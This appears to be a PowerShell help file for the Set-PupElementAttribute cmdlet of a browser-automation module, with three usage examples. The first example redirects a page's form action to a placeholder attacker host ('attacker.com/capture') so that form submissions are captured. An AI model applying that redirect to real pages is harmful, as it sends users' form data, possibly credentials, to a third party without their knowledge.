---
external help file: Pup.dll-Help.xml
Module Name:
online version:
schema: 2.0.0
---

# Set-PupElementAttribute

## SYNOPSIS
Sets an attribute value on an element.

## SYNTAX

## DESCRIPTION
Sets or modifies an HTML attribute on an element.
Can be used to manipulate form fields, change links, or modify element behavior.

## EXAMPLES

### Example 1: Change form action
```
$form = Find-PupElements -Page $page -Selector "form" -First
Set-PupElementAttribute -Element $form -Name "action" -Value "https://attacker.com/capture"
```

Modifies the form submission target.

### Example 2: Remove disabled attribute
```
$btn = Find-PupElements -Page $page -Selector "#submit-btn" -First
Set-PupElementAttribute -Element $btn -Name "disabled" -Remove
```

Enables a disabled button for testing.

### Example 3: Modify input type
```
$input = Find-PupElements -Page $page -Selector "input[type=hidden]" -First
Set-PupElementAttribute -Element $input -Name "type" -Value "text"
```

Changes hidden input to visible for inspection.

## PARAMETERS

### CommonParameters
This cmdlet supports the common parameters: -Debug, -ErrorAction, -ErrorVariable, -InformationAction, -InformationVariable, -OutVariable, -OutBuffer, -PipelineVariable, -Verbose, -WarningAction, and -WarningVariable. For more information, see [about_CommonParameters](http://go.microsoft.com/fwlink/?LinkID=113216).

## INPUTS

## OUTPUTS

## NOTES

## RELATED LINKS
